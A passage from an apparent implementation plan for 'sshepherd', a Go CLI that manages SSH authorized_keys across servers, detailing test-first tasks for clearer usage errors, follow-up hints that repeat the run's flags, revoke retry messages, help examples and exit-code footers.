	if m := err.Error(); strings.HasPrefix(m, "read manifest:") || strings.HasPrefix(m, "parse manifest:") {
		return err //nolint:wrapcheck // config's verdict already says what failed; a prefix would only stutter
	}
	return fmt.Errorf("invalid manifest %s: %w", path, err)
}

type missingManifestError struct {
	flag, path string
	err        error
}

func (e *missingManifestError) Error() string {
	create := "'sshepherd import --servers-only -o " + hintArg(e.path) + "'"
	if e.flag == "--config" && e.path == defaultConfigPath {
		return "no manifest at " + e.path + " — create one with " + create + ", or pass --config PATH"
	}
	return "no manifest at " + e.path + " — check " + e.flag + ", or create one with " + create
}

func (e *missingManifestError) Unwrap() error { return e.err }
```

  - Replace each `fmt.Errorf("load manifest: %w", err)` with `manifestError("--config", path, err)` (or `"--merge"` in import.go). The sites are audit.go:50, apply.go:63,67, adopt.go:263,267,273, editrun.go:66,77 and import.go:216,220.
  - adopt `--merge` (adopt.go:261): read through `readManifest(cf.cfgPath)` and use `m.Loaded` instead of `os.ReadFile`. Its errors then carry `read manifest:` like every other command.
  - Do **not** touch `internal/config/config.go` (P05 owns it). The helper depends on its two prefixes (config.go:77,89,96), and the "no stutter" test pins them.
- [ ] **Step 4: Run and expect PASS:** `go test -race ./cmd/sshepherd/`
- [ ] **Step 5: Check:** `grep -rn '"load manifest' cmd/sshepherd --include='*.go' | grep -v _test` should print nothing.

---

#### Task 5 (UX-8): plain usage errors

**Files:** `edit.go` (runFlags), `apply.go:53-59`, `editrun.go:45-58`, `run.go:176-227`, `run_test.go`, `apply_test.go:54-60`, `revoke_test.go:654`

- [ ] **Step 1: Write the failing tests** (`run_test.go`). Strengthen `apply_test.go:54` the same way.

```go
// TestUsageErrorsArePlain: our own wording, the plain "error:" format (no
// timestamp, even with -v), one line.
func TestUsageErrorsArePlain(t *testing.T) {
	path := writeConfig(t, "")
	for _, tt := range []struct {
		args []string
		want string
	}{
		{[]string{"audit", "-v", "-q", "--config", path}, "error: -v/--verbose and -q/--quiet cannot be combined; pick one\n"},
		{[]string{"apply", "--dry-run", "--yes", "--config", path}, "error: --dry-run and --yes cannot be combined: --dry-run previews without writing, --yes writes without asking\n"},
		{[]string{"revoke", "bob", "--dry-run", "--yes", "--config", path}, "error: --dry-run and --yes cannot be combined: --dry-run previews without writing, --yes writes without asking\n"},
		{[]string{"audti"}, "error: unknown command \"audti\" (did you mean audit?); see 'sshepherd --help'\n"},
		{[]string{"zzz"}, "error: unknown command \"zzz\"; see 'sshepherd --help'\n"},
	} {
		var out, errBuf bytes.Buffer
		if code := run(tt.args, &out, &errBuf); code != 3 {
			t.Errorf("%v: exit = %d, want 3", tt.args, code)
		}
		if errBuf.String() != tt.want {
			t.Errorf("%v: stderr = %q, want %q", tt.args, errBuf.String(), tt.want)
		}
	}
}
```

- [ ] **Step 2: Run and expect FAIL:** `go test ./cmd/sshepherd/ -run 'TestUsageErrorsArePlain|TestApplyDryRunYesConflict'`
- [ ] **Step 3: Implement.**
  - `edit.go`: delete `cmd.MarkFlagsMutuallyExclusive("dry-run", "yes")`. Rename `checkJSON` to `checkModes`. Its only callers are apply.go:57 and editrun.go:46.

```go
var errDryRunYes = errors.New("--dry-run and --yes cannot be combined: --dry-run previews without writing, --yes writes without asking")

// checkModes: --dry-run and --yes exclude each other, and --json needs one of them.
func (f *runFlags) checkModes() error {
	switch {
	case f.dryRun && f.yes:
		return errDryRunYes
	case f.json && !f.dryRun && !f.yes:
		return errJSONNeedsMode
	}
	return nil
}
```

  - `run.go`: delete `root.MarkFlagsMutuallyExclusive("verbose", "quiet")` (219). Cobra validated it *after* PersistentPreRunE had built the logger, which caused the timestamped ERROR. Check it first in `PersistentPreRunE`, before `a.logger` is set, so `a.log` falls back to the plain handler: `if verbose && quiet { return errors.New("-v/--verbose and -q/--quiet cannot be combined; pick one") }`.
  - `run.go` root: set `Args: cobra.ArbitraryArgs` so cobra's `legacyArgs` (args.go:28-44) no longer produces the multi-line suggestion. `RunE` words it on one line:

```go
RunE: func(cmd *cobra.Command, args []string) error {
	if len(args) == 0 {
		return errors.New("no command given (try --help)")
	}
	if s := cmd.SuggestionsFor(args[0]); len(s) > 0 {
		return fmt.Errorf("unknown command %q (did you mean %s?); see 'sshepherd --help'", args[0], strings.Join(s, ", "))
	}
	return fmt.Errorf("unknown command %q; see 'sshepherd --help'", args[0])
},
```

  This is how UX-8's "keep cobra usage errors multi-line" is met: the one usage error that was multi-line is now one line in our own words, so the log handler has nothing to fold. pflag errors (`unknown flag: --nope`) are already one line and stay as they are.
- [ ] **Step 4: Run and expect PASS:** `go test -race ./cmd/sshepherd/`. `TestRunNoCommand`, `TestRunNilArgsIgnoresOSArgs` and `TestRunUnknownFlag` must stay green.

---

#### Task 6 (UX-5): hints carry the run's flags, and `--no-apply` skips emptied servers

**Files:** `fleet.go` (`followUp`), `editrun.go:63-78,134-164,187-306,340-409`, `revoke.go:49-66,132-296`, `rotate.go`, `internal/apply/edit.go:62-113`, `internal/apply/edit_test.go`, `internal/apply/testdata/edit_header_*.golden`, `editrun_test.go`, `revoke_test.go`, `rotate_keep_old_test.go`, `revoke_server_test.go`

- [ ] **Step 1: Write the failing tests.**
  - `fleet_test.go`:

```go
// TestFollowUp: hints carry only flags the run set to non-defaults, quoted
// like hintArg; identity passphrases appear as file paths only.
func TestFollowUp(t *testing.T) {
	def := connFlags{cfgPath: defaultConfigPath, knownHosts: defaultKnownHosts}
	all := connFlags{cfgPath: "my fleet.yaml", knownHosts: "/tmp/kh", idf: identityFlags{
		paths: []string{"~/.ssh/ci"}, defaultFile: "/run/pp", perKey: []string{"/k/a=/k/a.pass"}}}
	for _, tt := range []struct {
		name string
		f    connFlags
		want string
	}{
		{"defaults", def, "sshepherd apply --server web-1"},
		{"all", all, "sshepherd apply --config 'my fleet.yaml' --known-hosts /tmp/kh --identity '~/.ssh/ci' " +
			"--identity-passphrase-file /run/pp --identity-passphrase /k/a=/k/a.pass --server web-1"},
	} {
		if got := tt.f.followUp().command("apply", nil, "--server web-1"); got != tt.want {
			t.Errorf("%s:\n got %q\nwant %q", tt.name, got, tt.want)
		}
	}
}
```

  - `editrun_test.go`: change `TestApplyHint` to call `applyHint(cf.followUp(), servers)`. Add a row with `knownHosts: "/kh"` that expects `sshepherd apply --config /etc/fleet.yaml --known-hosts /kh --server web-1 --server db-1`. Make the same change in `TestOverlapHint` (`overlapHint(o, h, …)`), with one row that carries `--known-hosts /kh` before `--operator`.
  - `revoke_test.go` `TestRevokePartialFailure` (line 397) and the line-489 case: the expected text becomes `… finish with: sshepherd apply --config <cfg> --known-hosts <kh> --server web-2`. In `TestRevokeKeyLeavesUngrantedDrift` (line 628): `… run 'sshepherd audit --config <cfg> --known-hosts <kh>' to confirm, 'sshepherd apply --config <cfg> --known-hosts <kh>' to sweep`. In the `TestRevokeUsage` "key not in the manifest" row: `run 'sshepherd audit --config CFG' to find where it is installed`.
  - New hermetic test in `revoke_test.go`, for the finding's exact scenario (identity + passphrase file, server down):

```go
func TestRevokeHintsCarryRunFlags(t *testing.T) {
	hosts, kh, _ := editFleet(t, []byte{1}, "web-1")
	hosts["web-1"].install(t, []byte{1, 2})
	id := encryptedKey(t, 1)
	pp := filepath.Join(t.TempDir(), "pp")
	if err := os.WriteFile(pp, []byte("pw\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg := writeConfig(t, "users:\n  - {name: alice, keys: ["+qk(t, 1)+"]}\n  - {name: bob, keys: ["+qk(t, 2)+"]}\nservers:\n"+hosts["web-1"].line("web-1")+
		fmt.Sprintf("  - {name: web-2, host: 127.0.0.1, port: %d, user: deploy}\n", closedPort(t))+
		"access:\n  - {user: alice, servers: [web-1, web-2]}\n  - {user: bob, servers: [web-1, web-2]}\n")
	var out, errBuf bytes.Buffer
	if code := run([]string{"revoke", "bob", "--yes", "--config", cfg, "--known-hosts", kh, "--identity", id, "--identity-passphrase-file", pp}, &out, &errBuf); code != 1 {
		t.Fatalf("exit = %d, want 1\n%s\n%s", code, out.String(), errBuf.String())
	}
	flags := " --config " + cfg + " --known-hosts " + kh + " --identity " + id + " --identity-passphrase-file " + pp
	for _, want := range []string{
		"finish with: sshepherd apply" + flags + " --server web-2\n",
		"run 'sshepherd audit" + flags + "' to confirm, 'sshepherd apply" + flags + "' to sweep\n",
	} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("stdout lacks %q:\n%s", want, out.String())
		}
	}
}
```

  - New `TestRevokeNoApplyExcludesEmptied` in `revoke_test.go`, using the `TestRevokeSoleGrantee` fleet (bob is the sole grantee of db-1). Run `revoke bob --no-apply --yes --config cfg`. Expect the output to contain `run 'sshepherd apply --config <cfg> --server web-1' to push` and **not** `--server db-1`. Also add an "all emptied" subtest: when the only affected server is emptied, stdout contains `no servers contacted — nothing to push: every affected server would be left with no granted keys (see the warnings above)`.
  - `rotate_keep_old_test.go:163-164`: add `" --known-hosts "+kh` before ` --server web-2` / at the end of the finish command. Lines 150 and 173 use `--no-apply`, so they get no connection flags and stay unchanged.
  - `internal/apply/edit_test.go`: a new case in `TestRenderEditHeaderGoldens`, `edit_header_followup.golden`, with `EditSummary{FollowUp: " --config fleet.yaml", Edits: []Edit{{Kind: EditRemoveKey, User: "bob", Fingerprint: "SHA256:x", NoKeysLeft: true}}, Affected: 1}`. Its expected note line is `note: bob has no keys left — 'sshepherd revoke bob --config fleet.yaml' removes the user`.
- [ ] **Step 2: Run and expect FAIL:** `go test ./cmd/sshepherd/ -run 'TestFollowUp|TestApplyHint|TestOverlapHint|TestRevoke|TestRotateKeepOld' && go test ./internal/apply/ -run TestRenderEditHeader`
- [ ] **Step 3: Implement.**
  - `fleet.go`:

```go
// followUp builds copy-paste follow-up commands carrying the run's own
// non-default flags, so a pasted hint reads the same manifest with the same
// known_hosts and keys. Values are paths, never file contents; --parallel
// is tuning, not correctness, and is left out.
type followUp struct {
	config string   // "--config X", or "" for the default
	conn   []string // "--known-hosts X", "--identity Y", … in flag order
}

func (f *connFlags) followUp() followUp {
	var h followUp
	if f.cfgPath != defaultConfigPath {
		h.config = "--config " + hintArg(f.cfgPath)
	}
	if f.knownHosts != defaultKnownHosts {
		h.conn = append(h.conn, "--known-hosts "+hintArg(f.knownHosts))
	}
	for _, p := range f.idf.paths {
		h.conn = append(h.conn, "--identity "+hintArg(p))
	}
	if f.idf.defaultFile != "" {
		h.conn = append(h.conn, "--identity-passphrase-file "+hintArg(f.idf.defaultFile))
	}
	for _, kv := range f.idf.perKey {
		h.conn = append(h.conn, "--identity-passphrase "+hintArg(kv))
	}
	return h
}

// command renders "sshepherd SUB LEAD… [--config] [connection flags] TAIL…"
// (lead: e.g. --key FP; tail: e.g. --server NAME, --operator).
func (h followUp) command(sub string, lead []string, tail ...string) string {
	parts := append([]string{"sshepherd", sub}, lead...)
	if h.config != "" {
		parts = append(parts, h.config)
	}
	parts = append(append(parts, h.conn...), tail...)
	return strings.Join(parts, " ")
}
```

  - `editrun.go`. In `runEdit`, build `h := f.run.followUp()` once and pass it down. A `--no-apply` run sets no connection flags (`validate`, editrun.go:49-55), so its hints carry `--config` only.
    - `applyHint(h followUp, servers []string)` returns `h.command("apply", nil, "--server "+hintArg(s)…)`.
    - `overlapHint(o, h, …)` builds `h.command("revoke", []string{"--key", hintArg(o.oldFP)}, opTail…)`, where `opTail` is `--operator` when the user is an operator.
    - `printScope(w, h, contacted, fleet)` prints `… run '%s' to confirm, '%s' to sweep` with `h.command("audit", nil)` and `h.command("apply", nil)`.
    - In `finishEdit`, the `cfgPath string` parameter becomes `h followUp`.
    - In `loadForEdit`, the "edit by hand and run 'sshepherd apply'" text gets a `--config` when it is not the default, via `(&connFlags{cfgPath: path, knownHosts: defaultKnownHosts}).followUp().command("apply", nil)`.
  - `saveOnly(cmd, log, stdout, f, ep, aff apply.AffectedSet, doc, h)`. `EditPrompt` and `overlapHint` keep `len(aff.Servers)`. The push hint uses only the servers apply would not refuse, as `finishEdit` already does (editrun.go:362):

```go
pushable := slices.DeleteFunc(slices.Clone(aff.Servers), func(s string) bool { return slices.Contains(aff.Emptied, s) })
switch {
case f.noApply && len(aff.Servers) == 0:
	fmt.Fprintln(stdout, "no servers contacted — no server's desired keys changed")
case f.noApply && len(pushable) == 0:
	fmt.Fprintln(stdout, "no servers contacted — nothing to push: every affected server would be left with no granted keys (see the warnings above)")
case f.noApply:
	fmt.Fprintf(stdout, "no servers contacted — %s still %s the old keys; run '%s' to push\n",
		apply.Plural(len(pushable), "affected server", "affected servers"), pluralWord(len(pushable), "carries", "carry"), applyHint(h, pushable))
case ep.removesKey:
	printScope(stdout, h, 0, len(ep.edited.Servers))
}
```

  (`pluralWord` replaces the hand-written verb switch at editrun.go:293-296. If gocyclo (limit 15) flags `saveOnly`, move this switch into `noApplyNote(stdout, f, ep, aff, h)`.)
  - `revoke.go`. `planRevokeKeys(mf, keys, operator, h)`: the "not in the manifest" text names `h.command("audit", nil)`. `accessProblems(cfg, users, servers, h)`: the operator text names `h.command("revoke", []string{name}, "--operator")`. The call sites at revoke.go:56-60 pass `f.run.followUp()`.
  - `internal/apply/edit.go`. Add `FollowUp string` to `EditSummary`, documented as "the run's non-default flags appended to a header's `sshepherd revoke USER` hints; "" for none; not part of the JSON". The three notes (edit.go:99,101,103) render `'sshepherd revoke %s%s'` with `e.User, s.FollowUp`. `runEdit` sets `ep.summary.FollowUp = h.suffix()` before the header renders. Add this to `fleet.go`:

```go
// suffix is the flags part of command, with a leading space ("" for none).
func (h followUp) suffix() string {
	parts := h.conn
	if h.config != "" {
		parts = append([]string{h.config}, parts...)
	}
	if len(parts) == 0 {
		return ""
	}
	return " " + strings.Join(parts, " ")
}
```

 `jsonEditFor` (json.go:220, P07's file) copies named fields only, so the new field never reaches JSON. P07's `json_test.go` goldens confirm it.
- [ ] **Step 4: Regenerate and check:** `go test ./internal/apply/ -run TestRenderEditHeader -update`. Only `edit_header_followup.golden` is new, and every existing `edit_header_*.golden` must be byte-identical (`git diff --stat internal/apply/testdata` lists only the new file and `edit_prompt.golden`). Then run `go test -race ./cmd/sshepherd/ ./internal/apply/` and expect PASS.

---

#### Task 7 (UX-6): a retried revoke explains itself

**Files:** `revoke.go:132-162`, `revoke_test.go`, README.md:799-800

- [ ] **Step 1: Write the failing tests** (`revoke_test.go`).
  - In `TestRevokeUsage`, change the `"unknown users listed"` row's `want` to `"unknown users: carol, dave — not in the manifest (already revoked?); see what is left to push with 'sshepherd apply --dry-run --config CFG', verify with 'sshepherd audit --config CFG'"`.
  - New end-to-end retry:

```go
// TestRevokeRetryAfterSave: a revoke whose save landed but whose push did
// not is retried as is; the retry exits 3, changes nothing, contacts no
// server, and points at the apply that finishes the job.
func TestRevokeRetryAfterSave(t *testing.T) {
	hosts, kh, cfg := twoUserFleet(t)
	var out, errBuf bytes.Buffer
	if code := run([]string{"revoke", "bob", "--no-apply", "--yes", "--config", cfg}, &out, &errBuf); code != 0 {
		t.Fatalf("first run exit = %d\n%s", code, errBuf.String())
	}
	before := fileBytes(t, cfg)
	out.Reset()
	errBuf.Reset()
	if code := run([]string{"revoke", "bob", "--yes", "--config", cfg, "--known-hosts", kh}, &out, &errBuf); code != 3 {
		t.Fatalf("retry exit = %d, want 3", code)
	}
	want := "unknown user: bob — not in the manifest (already revoked?); see what is left to push with 'sshepherd apply --dry-run --config " +
		cfg + " --known-hosts " + kh + "', verify with 'sshepherd audit --config " + cfg + " --known-hosts " + kh + "'"
	if !strings.Contains(errBuf.String(), want) {
		t.Errorf("stderr = %q, want %q", errBuf.String(), want)
	}
	if !bytes.Equal(fileBytes(t, cfg), before) {
		t.Error("the retry changed the manifest")
	}
	for name, h := range hosts {
		if len(h.srv.Attempts()) != 0 {
			t.Errorf("the retry connected to %s", name)
		}
	}
}
```

- [ ] **Step 2: Run and expect FAIL:** `go test ./cmd/sshepherd/ -run 'TestRevokeUsage|TestRevokeRetryAfterSave'`
- [ ] **Step 3: Implement.** Change the signature to `planRevokeUsers(mf, users, operator, h followUp)`:

```go
if len(unknown) > 0 {
	return editPlan{}, fmt.Errorf("unknown %s: %s — not in the manifest (already revoked?); see what is left to push with '%s', verify with '%s'",
		pluralWord(len(unknown), "user", "users"), strings.Join(unknown, ", "),
		h.command("apply", []string{"--dry-run"}), h.command("audit", nil))
}
```

  The exit stays 3, as decided (README:1350). The hint suggests `apply --dry-run` rather than `apply --server …` because the user's former servers are no longer in the manifest. The dry-run is safe and shows exactly what is left to push. `accessProblems` (the `--server` form) keeps `unknown user: carol;` unchanged, and revoke_server_test.go:75 pins it.
- [ ] **Step 4: Run and expect PASS:** `go test -race ./cmd/sshepherd/ -run TestRevoke`

---

#### Task 7b (UX-7, minimal fix within today's behavior): `revoke --server` says what access is left

> **Added by the review panel (product-ux).** UX-7's concrete risk is `revoke alice --server web-1` meant as "just web-1 first", leaving alice everywhere else with exit 0. The finding's "at minimum" fix only adds output, so it needs no decision and lands now. The flag renames stay D26 (P10).

**Files:** `internal/apply/edit.go` (`Edit` struct, `editText` `EditRemoveAccess` case :123-128), `internal/apply/edit_test.go`, `internal/apply/testdata/edit_header_access_keeps.golden` (new), `cmd/sshepherd/revoke.go` (`planRevokeAccess` :224-252), `cmd/sshepherd/revoke_test.go`

- [ ] **Step 1: Failing tests.** In `edit_test.go`, add a row to `TestRenderEditHeaderRemoveAccess`:

```go
		{"edit_header_access_keeps.golden", EditSummary{
			Edits:    []Edit{{Kind: EditRemoveAccess, User: "alice", AccessServers: []string{"web-1"}, EntriesChanged: 1, KeepsServers: 3}},
			Affected: 1,
		}, false},
```

and in `TestEditTextRemoveAccessCounts`-style form, `TestEditTextKeepsServers`: `editText(Edit{Kind: EditRemoveAccess, User: "alice", AccessServers: []string{"web-1"}, EntriesChanged: 1, KeepsServers: 3})` contains `alice keeps access to 3 other servers` and, with `KeepsServers: 1`, `1 other server`; with `KeepsServers: 0` it contains neither. In `revoke_test.go`, `TestRevokeServerPrintsKeptAccess`: a manifest granting alice `web-1, web-2, db-1`; `revoke alice --server web-1 --dry-run` prints `alice keeps access to 2 other servers`.
- [ ] **Step 2: Run, expect FAIL** (`unknown field KeepsServers`): `go test ./internal/apply/ -run 'RemoveAccess|KeepsServers'` and `rtk proxy go test ./cmd/sshepherd/ -run TestRevokeServerPrintsKeptAccess`.
- [ ] **Step 3: Implement.** `Edit` gains `KeepsServers int // (EditRemoveAccess) servers the user still covers after the edit`. In `editText`'s `EditRemoveAccess` case, after the counts, when `e.KeepsServers > 0` append `"; " + e.User + " keeps access to " + Plural(e.KeepsServers, "other server", "other servers")`. In `planRevokeAccess`, after `ep.edited` is known, set `ep.summary.Edits[i].KeepsServers` to the number of `ep.edited.Servers` for which `ep.edited.Covers(e.User, srv.Name)` is true.
- [ ] **Step 4: Run, expect PASS.** Generate the new golden with `go test ./internal/apply/ -run TestRenderEditHeaderRemoveAccess -update`, read it by eye, and confirm the other goldens did not move.

#### Task 8 (UX-9): `Example:` blocks and exit-code footers

**Files:** `audit.go:38-41`, `apply.go:30-51`, `revoke.go:23-39`, `rotate.go:27-40`, `run.go` (footer constants), `run_test.go`, `testdata/help/*.golden`

- [ ] **Step 1: Write the failing tests** (`run_test.go`).

```go
// TestHelpExamplesAndExitCodes: every write/monitoring command shows
// examples and its exit-code footer, every example line parses against the
// real flag set, and README's Exit codes section carries both footers verbatim.
func TestHelpExamplesAndExitCodes(t *testing.T) {
	raw, err := os.ReadFile("../../README.md")
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range []string{exitCodesAudit, exitCodesWrite} {
		if !strings.Contains(string(raw), f) {
			t.Errorf("README lacks the --help footer:\n%s", f)
		}
	}
	for name, footer := range map[string]string{"audit": exitCodesAudit, "apply": exitCodesWrite, "revoke": exitCodesWrite, "rotate": exitCodesWrite} {
		var out, errBuf bytes.Buffer
		if code := run([]string{name, "--help"}, &out, &errBuf); code != 0 {
			t.Fatalf("%s --help exit = %d", name, code)
		}
		help := out.String()
		if !strings.Contains(help, "Examples:\n") || !strings.Contains(help, footer) {
			t.Errorf("%s --help lacks examples or footer:\n%s", name, help)
		}
		_, ex, _ := strings.Cut(help, "Examples:\n")
		for _, line := range strings.Split(ex, "\n") {
			line = strings.TrimSpace(line)
			if !strings.HasPrefix(line, "sshepherd ") {
				continue
			}
			root := newRootCmd(&app{}, io.Discard, io.Discard)
			cmd, rest, err := root.Find(strings.Fields(line)[1:])
			if err == nil {
				err = cmd.ParseFlags(rest)
			}
			if err != nil {
				t.Errorf("%s example %q does not parse: %v", name, line, err)
			}
		}
	}
}
```

- [ ] **Step 2: Run and expect FAIL** (`undefined: exitCodesAudit`): `go test ./cmd/sshepherd/ -run TestHelpExamplesAndExitCodes`
- [ ] **Step 3: Implement.** `run.go`, next to `exitCodeFor`:

```go
// exitCodesAudit and exitCodesWrite end the --help description of audit and
// of apply/revoke/rotate; README's Exit codes section carries both verbatim.
const exitCodesAudit = `Exit codes:
  0  compliant
  1  drift or unreachable servers (compliance not proven)
  2  critical: a missing operator key, or a changed or @revoked host key
  3  tool error: bad flags, unloadable manifest, failed preflight, interrupted`

const exitCodesWrite = `Exit codes:
  0  converged: nothing left to do
  1  pending changes, unreachable or refused servers, or a declined prompt
  3  tool error: bad flags, unloadable manifest, failed preflight, or refused
     before anything was saved or written`
```

  - `audit.go`: add `Long: "Reports drift between the manifest and each server's authorized_keys.\nRead-only: nothing is written to any server.\n\n" + exitCodesAudit`, and add an `Example:` with these lines:

```
  # Check the whole fleet
  sshepherd audit --config fleet.yaml

  # Monitoring: JSON report on stdout, alert on the exit code
  sshepherd audit --json --config fleet.yaml
```

  - `apply.go`: `Long: <existing text> + "\n\n" + exitCodesWrite`, and add an `Example:` with these lines:

```
  # Preview, then write after one confirmation
  sshepherd apply --dry-run
  sshepherd apply

  # Canary: one server first, then the rest
  sshepherd apply --server web-1
  sshepherd apply

  # CI with a deploy key instead of ssh-agent
  sshepherd apply --yes --identity ~/.ssh/ci --identity-passphrase-file /run/secrets/ci.pass
```

  - `revoke.go`: append the write footer to `Long`, and add an `Example:` with these lines:

```
  # Offboard a user everywhere
  sshepherd revoke alice

  # Lost laptop: revoke one key, keep the user
  sshepherd revoke --key ~/alice-laptop.pub

  # Remove a user's access to one server only
  sshepherd revoke alice --server db-1

  # Record the edit now, push it later
  sshepherd revoke alice --no-apply
```

  - `rotate.go`: append the write footer to `Long`, and add an `Example:` with these lines. The headless line is the README's (README.md:1137-1138), joined onto one line so the parse test can read it.

```
  # Replace a key in place
  sshepherd rotate alice --old ~/.ssh/alice_old.pub --new ~/.ssh/alice_new.pub

  # Overlap old and new while clients switch, finish later with revoke --key
  sshepherd rotate deploy --old ~/.ssh/deploy_old.pub --new ~/.ssh/deploy_2027.pub --keep-old

  # Headless rotation of the key this machine logs in with
  sshepherd rotate ci --operator --old ~/.ssh/ci_old.pub --new ~/.ssh/ci_new.pub --yes --identity ~/.ssh/ci_old --identity ~/.ssh/ci_new
```

  The existing `Long` prose is not trimmed here. The finding's optional "trim the Long text" is listed under Out of scope.
- [ ] **Step 4: Regenerate the help goldens and check them:** `go test ./cmd/sshepherd/ -run Help -update` (P01's help golden test reads the package-wide `-update` flag, import_test.go:17). Read every changed `testdata/help/*.golden`. The diffs must be exactly the new `Examples:` blocks, the footers, audit's new description and nothing else. Since Task 1 kept the flag wording, no flag rows change.
- [ ] **Step 5: Run and expect PASS** after the README step in Task 9: `go test ./cmd/sshepherd/ -run 'Help|TestHelpExamplesAndExitCodes'`

---

#### Task 9: README, CLAUDE.md, and the full check

The agent edits only the README sections listed here. The integrator owns CLAUDE.md and merges README hunks that other packages also touch.

- [ ] **README.md:123-142 (Quick start, step 1)** — real bootstrap order, ending in **one** manifest (review panel, product-ux: the earlier draft left `sshepherd.yaml` servers-only and `adopted.yaml` unused, so step 2's `audit` showed every key as UNAUTHORIZED):

```console
$ sshepherd import --servers-only -o sshepherd.yaml   # servers from ~/.ssh/config
$ sshepherd adopt --merge                             # adds every installed key to sshepherd.yaml
$ git diff sshepherd.yaml                             # review what adopt added
```

  The prose says `adopt` needs a manifest that lists the servers, that `import --servers-only` gives one, and that `adopt --merge` updates `--config` (default `sshepherd.yaml`) in place under the manifest lock. The full `import` (users from `.pub` files) remains the alternative.
- [ ] **Quick start check:** add a hermetic `TestQuickStartBootstrap` to `cmd/sshepherd/adopt_test.go` (P06's file; `e2e_test.go` belongs to P13 later): `import --servers-only -o M` from a one-host ssh config pointing at `hermeticFleet`'s server, then `adopt --merge --config M`, then `audit --config M` must exit 0.
- [ ] **README.md:182-194 (Quick start §4, offboarding)** — no-decision docs fix for most of PRD-2 (review panel, product-ux): push the manifest before writing servers, so no stale copy exists when the servers change:

```console
$ sshepherd revoke alice --no-apply                   # edit and save the manifest only
$ git commit -am "offboard alice" && git push         # publish the edit first
$ sshepherd apply                                     # then converge the fleet
$ sshepherd audit
```
- [ ] **README.md:865**: re-copy the prompt block from `internal/apply/testdata/edit_prompt.golden`. **README.md:991**: "the prompt is prefixed `OPERATOR NAME: ` (`OPERATORS A, B: ` for several)".
- [ ] **README.md:799-800**: append "Re-running a revoke whose save landed but whose push did not finish exits `3` with `not in the manifest (already revoked?)` and the `apply --dry-run`/`audit` commands to finish and verify." (D1c may later turn this into exit 0; that lands with P04-impl in W4.)
- [ ] **README revoke `--server`** (around the `--server` paragraph): add "The edit header says how many other servers each user keeps (`alice keeps access to 2 other servers`); `revoke USER` without `--server` removes every grant." Copy the line from `edit_header_access_keeps.golden`.
- [ ] **README `revoke`/`rotate` hint prose** (around 836, 1118 and the `scope:` paragraph): add one sentence: "Follow-up hints repeat the run's own `--config`, `--known-hosts` and `--identity*` flags (paths only), so they can be pasted as is; `--no-apply` hints leave out servers that would be emptied." Sample lines that use defaults stay as they are.
- [ ] **README Exit codes (1340-1350)**: below the table, add "`--help` shows this summary:" followed by two `console` blocks that contain `exitCodesAudit` and `exitCodesWrite` exactly as written. Copy them from `testdata/help/audit.golden` and `apply.golden`.
- [ ] **README copied `--help` output** (if P01 added any): re-copy it from `testdata/help/*.golden`.
- [ ] Run `make check`. Expect PASS (gofmt, goimports, vet, golangci-lint including wrapcheck/gocyclo, deadcode, which must now report `nWord` gone and nothing new unreachable, gosec, tests with race, and the coverage gate).

---

#### Risks and verification

- **Hint correctness is the point of UX-5.** The E2E test (e2e_test.go:371-389) already runs the printed `rotate --keep-old` finish command. After this package that command carries `--known-hosts`, and the E2E test appends a second `--known-hosts` (pflag keeps the last value, which is harmless). `make integration` proves the pasted command works against a real sshd.
- **Passphrase safety.** `followUp` only ever reads flag values (paths). `TestFollowUp` and `TestRevokeHintsCarryRunFlags` pin that the passphrase appears only as its file path. No code path reads passphrase file contents for a hint.
- **Wording that P05 and P07 depend on.** `manifestError` keys on config's `read manifest:`/`parse manifest:` prefixes (P05 edits config.go in the same wave). `logManifest`, `fleetSession.Read` and `EditPrompt` call `apply.Plural` (P07 edits report.go in the same wave). Both must keep those names and prefixes. The tests above fail loudly if either drifts.
- **gocyclo 15:** `saveOnly` and `finishEdit` gain parameters, not branches, except the one new `case`. Split it out as described in Task 6 if lint complains.
- **Unit:** every task above. **Hermetic integration:** `TestFleetSessionRead`, `TestRevokeHintsCarryRunFlags`, `TestRevokeRetryAfterSave`, `TestRevokeNoApplyExcludesEmptied`. **Docker integration and E2E:** `make integration` (identity_integration_test.go asserts no hint text, so it should be unaffected).

#### Acceptance

```bash
go test -race ./cmd/sshepherd/... ./internal/apply/...
make check
make integration
# ARC-5: one fleet-read setup, one default path, one word-pluralizer
grep -n 'sshread.LoadKnownHosts\|&sshread.Client{' cmd/sshepherd/*.go | grep -v _test   # fleet.go only
grep -n '"sshepherd.yaml"' cmd/sshepherd/*.go | grep -v _test                           # paths.go only
grep -rn 'func nWord\|MarkFlagsMutuallyExclusive\|"load manifest' cmd/sshepherd --include='*.go' | grep -v _test   # nothing
grep -rnE 'server\(s\)|%d servers|%d users' cmd/sshepherd internal/apply --include='*.go' | grep -v _test      # nothing
git diff --stat internal/apply/testdata cmd/sshepherd/testdata   # only edit_prompt.golden, edit_header_followup.golden (new), help/*.golden
```

#### Handoff to the integrator

- **File-list amendments** (see Files owned): `cmd/sshepherd/edit.go` (runFlags block), `rotate_keep_old_test.go:163-164`, `revoke_server_test.go` (only if the operator-refusal text at revoke.go:283 changes its assertion at line 75). If edit.go cannot be granted, the integrator applies Task 1's embed and Task 5's `checkModes` hunk to edit.go by hand.
- **Tests owned by P07** (`json_cmd_test.go`, `audit_hermetic_test.go`): a grep found no assertion on the changed strings (`load manifest`, `N servers`, prompts, hints). The integrator re-runs them after merging both packages.
- **e2e_test.go (P13, wave 2):** `--known-hosts` is passed twice when the finish hint is replayed (e2e_test.go:388). This is harmless. P13 may drop the append.
- **CLAUDE.md Status (line 341):** "Report count strings are pluralized" becomes "Count strings in logs, reports and prompts are pluralized; follow-up hints carry the run's own flags; `--help` has examples and exit codes; audit, adopt and apply share one fleet-read setup (`cmd/sshepherd/fleet.go`)".
- **Later packages build on this:** P12 (wave 2) rewrites `adopt.go`/`import.go`/`revoke.go`/`edit.go`, and P13 (wave 2) changes `run.go`/`run_test.go`. Both must rebase onto `connFlags`/`fleetSession`/`followUp`/`manifestError`. P14 (wave 4) should move `fleetSession` into its `internal/workflow` (or `internal/fleet`) rather than re-copy it. D23 (bastions) and D17 (key offering) will each change `openFleet`/`Read` in one place. If D26 renames flags, `followUp` must follow.

#### Out of scope

- An idempotent `revoke` (exit 0 when the user is already absent). The verifier calls this a design preference, and exit 3 is documented (README:1350), so changing it needs an owner decision. The same goes for a retry hint on `rotate` when `--old` is already rotated out (`rotate.go:115`).
- Trimming `apply`/`revoke`/`rotate` `Long` text (UX-9's optional part).
